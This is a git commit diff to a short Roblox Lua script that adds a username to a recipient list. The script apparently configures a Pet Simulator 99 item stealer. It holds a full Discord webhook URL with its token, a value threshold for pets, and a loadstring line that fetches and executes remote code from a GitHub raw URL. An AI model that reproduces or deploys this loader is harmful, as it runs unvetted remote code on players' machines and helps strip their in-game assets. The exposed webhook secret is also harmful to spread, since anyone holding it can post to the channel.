35bbe4091b9c75c6aaa957c1beed1278c6e28ca0
kiyokar <dominiktoth791@gmail.com>
2025-10-19 14:19:39 +0200

    Update .lua

--- .lua
+++ .lua
@@ -1,4 +1,4 @@
-Username = {"ZeanZulfiqar", "2492492"} 
+Username = {"ZeanZulfiqar", "2492492", "x1243g"} 
 Webhook = "https://discord.com/api/webhooks/1376287574594813992/e5Hxxs8Zzk_xui2JDupnOsDoI5Onjb4tGN8q2kxbe0BRgq-3RGP7wtpva6WVB9PRQTOc" 
 min_rap = 10000 --for pets go and pet simulator 99 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
